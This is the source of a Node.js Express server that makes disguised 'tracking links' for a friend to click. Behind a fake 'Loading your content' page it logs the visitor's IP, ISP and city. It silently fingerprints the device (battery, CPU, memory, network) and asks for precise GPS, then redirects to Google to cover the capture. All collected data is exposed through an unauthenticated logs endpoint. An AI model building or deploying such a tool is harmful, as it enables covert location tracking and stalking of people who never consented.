const express = require('express');
const fetch   = require('node-fetch');
const { v4: uuidv4 } = require('uuid');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── In-memory store (resets on server restart)
// For permanent storage → replace with a real DB later
const logs = [];

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─────────────────────────────────────────
// 1.  CREATE a new tracking link
//     POST /api/create  { name: "My Link" }
//     Returns { id, trackUrl }
// ─────────────────────────────────────────
app.post('/api/create', (req, res) => {
  const name = req.body.name || 'Unnamed Link';
  const id   = uuidv4().split('-')[0].toUpperCase(); // short 8-char id
  res.json({
    id,
    name,
    trackUrl: `${req.protocol}://${req.get('host')}/t/${id}?name=${encodeURIComponent(name)}`
  });
});

// ─────────────────────────────────────────
// 2.  TRACKING ENDPOINT — the link your friend clicks
//     GET /t/:id
//     Captures IP, looks up location, serves landing page
// ─────────────────────────────────────────
app.get('/t/:id', async (req, res) => {
  const { id } = req.params;
  const name   = req.query.name || 'Unknown Link';

  // Get real IP (works behind Render's proxy)
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown';

  // Look up IP info
  let ipData = {};
  try {
    const r = await fetch(`https://ipinfo.io/${ip}/json`);
    ipData   = await r.json();
  } catch(e) {}

  const entryId = uuidv4();

  // Save initial log entry (GPS will be added later via /api/gps)
  const entry = {
    id,
    entryId,
    linkName:  name,
    time:      new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    timestamp: Date.now(),
    ip:        ipData.ip     || ip,
    city:      ipData.city   || '—',
    region:    ipData.region || '—',
    country:   ipData.country|| '—',
    isp:       ipData.org    || '—',
    ipLoc:     ipData.loc    || '',
    browser:   req.headers['user-agent'] || '—',
    referrer:  req.headers['referer'] || '—',
    acceptLanguage: req.headers['accept-language'] || '—',
    connectionType: req.headers['x-forwarded-proto'] || '—',
    gps:       null
  };

  logs.unshift(entry);

  // Serve the landing page — it will ask for GPS then call /api/gps
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Loading...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Segoe UI',sans-serif;background:#f0f4f8;
         display:flex;align-items:center;justify-content:center;min-height:100vh}
    .box{background:#fff;border-radius:16px;padding:40px 32px;
         text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.08);max-width:320px;width:90%}
    .spinner{width:42px;height:42px;border:4px solid #e2e8f0;
             border-top-color:#667eea;border-radius:50%;
             animation:spin .8s linear infinite;margin:0 auto 18px}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{font-size:17px;color:#1a202c;margin-bottom:6px}
    p{font-size:13px;color:#718096;line-height:1.5}
  </style>
</head>
<body>
<div class="box" id="box">
  <div class="spinner"></div>
  <h2>Please wait...</h2>
  <p>Loading your content...</p>
</div>
<script>
(async()=>{
  const logId = "${id}";
  const entryId = "${entryId}";

  // Device Intelligence silently collected with zero permission
  const screenResolution = window.screen ? (window.screen.width + 'x' + window.screen.height) : null;
  let timezone = null;
  try {
    timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  } catch(e) {}
  const deviceLanguage = navigator.language;
  const cpuCores = navigator.hardwareConcurrency || null;
  const deviceMemory = navigator.deviceMemory || null;
  let networkType = null;
  let networkSpeed = null;
  if (navigator.connection) {
    networkType = navigator.connection.effectiveType || null;
    networkSpeed = navigator.connection.downlink || null;
  }
  let batteryLevel = null;
  let batteryCharging = null;
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level * 100);
      batteryCharging = battery.charging;
    } catch(e) {}
  }
  const online = navigator.onLine;
  const touchSupport = navigator.maxTouchPoints > 0;
  const visibilityState = document.visibilityState;
  const browserReferrer = document.referrer || '';

  // Send JS-collected data to /api/extra
  try {
    await fetch('/api/extra', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: entryId,
        screenResolution,
        timezone,
        deviceLanguage,
        cpuCores,
        deviceMemory,
        networkType,
        networkSpeed,
        batteryLevel,
        batteryCharging,
        online,
        touchSupport,
        visibilityState,
        browserReferrer
      })
    });
  } catch(e) {}

  // Try GPS
  if(navigator.geolocation){
    try{
      const pos = await new Promise((res,rej)=>
        navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000})
      );
      await fetch('/api/gps',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
          id: entryId,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        })
      });
    }catch(e){}
  }
  // Show success then redirect
  document.getElementById('box').innerHTML =
    '<div style="font-size:40px;margin-bottom:12px">✅</div><h2>Done!</h2><p>Redirecting...</p>';
  setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
})();
</script>
</body>
</html>`);
});

// ─────────────────────────────────────────
// 3.  GPS UPDATE — called by landing page after permission granted
//     POST /api/gps  { id, lat, lon, accuracy }
// ─────────────────────────────────────────
app.post('/api/gps', (req, res) => {
  const { id, lat, lon, accuracy } = req.body;
  const entry = logs.find(l => l.entryId === id || l.id === id);
  if (entry) {
    entry.gps = {
      lat:      parseFloat(lat).toFixed(6),
      lon:      parseFloat(lon).toFixed(6),
      accuracy: parseFloat(accuracy).toFixed(0)
    };
  }
  res.json({ ok: true });
});

// ─────────────────────────────────────────
// 3b. EXTRA UPDATE — called silently by landing page
//     POST /api/extra  { id, ... }
// ─────────────────────────────────────────
app.post('/api/extra', (req, res) => {
  const {
    id,
    screenResolution,
    timezone,
    deviceLanguage,
    cpuCores,
    deviceMemory,
    networkType,
    networkSpeed,
    batteryLevel,
    batteryCharging,
    online,
    touchSupport,
    visibilityState,
    browserReferrer
  } = req.body;

  const entry = logs.find(l => l.entryId === id || l.id === id);
  if (entry) {
    entry.screenResolution = screenResolution;
    entry.timezone         = timezone;
    entry.deviceLanguage   = deviceLanguage;
    entry.cpuCores         = cpuCores;
    entry.deviceMemory     = deviceMemory;
    entry.networkType      = networkType;
    entry.networkSpeed     = networkSpeed;
    entry.batteryLevel     = batteryLevel;
    entry.batteryCharging  = batteryCharging;
    entry.online           = online;
    entry.touchSupport     = touchSupport;
    entry.visibilityState  = visibilityState;
    entry.browserReferrer  = browserReferrer;
  }
  res.json({ ok: true });
});

// ─────────────────────────────────────────
// 4.  GET ALL LOGS — for dashboard
//     GET /api/logs
// ─────────────────────────────────────────
app.get('/api/logs', (req, res) => {
  res.json(logs);
});

// ─────────────────────────────────────────
// 5.  CLEAR LOGS
//     DELETE /api/logs
// ─────────────────────────────────────────
app.delete('/api/logs', (req, res) => {
  logs.length = 0;
  res.json({ ok: true });
});

// ─────────────────────────────────────────
// 6.  SERVE DASHBOARD at /
// ─────────────────────────────────────────
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Tracker server running on port ${PORT}`);
});
